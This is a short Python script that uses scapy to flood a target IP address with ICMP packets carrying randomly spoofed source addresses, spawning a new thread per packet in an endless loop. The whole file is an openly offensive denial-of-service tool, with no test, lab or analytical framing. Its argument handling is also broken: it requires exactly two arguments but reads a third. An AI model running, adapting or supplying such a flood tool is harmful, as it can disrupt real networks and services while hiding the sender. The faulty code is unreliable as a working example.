#!/usr/bin/env python

import socket
import random
import sys
import threading
from scapy.all import *

if len(sys.argv) != 3:
	print "Usage: %s <Target IP> <Port> <interface>" % sys.argv[0]
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
interface = sys.argv[3]

total = 0


class sendICMP(threading.Thread):
    # inheritance threading.Thread
	global target, port

	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(
			1, 254), random.randint(1, 254), random.randint(1, 254))
		i.dst = target

		t = ICMP()

		send(i / t, verbose=0, iface=interface)


print "Flooding %s:%i with ICMP packets." % (target, port)
while 1:
	sendICMP().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
